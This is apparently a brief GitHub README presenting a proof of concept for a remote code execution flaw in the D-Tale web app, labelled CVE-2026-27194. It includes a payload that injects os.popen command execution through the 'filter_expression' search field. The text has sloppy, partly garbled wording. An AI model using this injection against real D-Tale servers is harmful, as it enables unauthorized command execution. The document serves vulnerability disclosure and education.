#### This is only for Education Purpose.

# D-Tale RCE--> CVE-2026-27194
> [!WARNING]
> While Search in the table i do can of EOL Error, when putting a single quote here.
<img width="1531" height="422" alt="image" src="https://github.com/user-attachments/assets/834834b5-2992-4dea-90cf-444516c01b72" />

### Python Script
> [!WARNING]
> To demonstrate this CVE. I wrote a pythons script that will do a Arbitrary Code Injection in the web-portal.

# Profe of Concept 
```bash
payload = {
    "filter_expression": f'__import__("os").popen("Command Execution").read()'
}
```
<img width="1904" height="530" alt="image" src="https://github.com/user-attachments/assets/5afb135c-0d10-4428-81a7-d8153550afb5" />

 
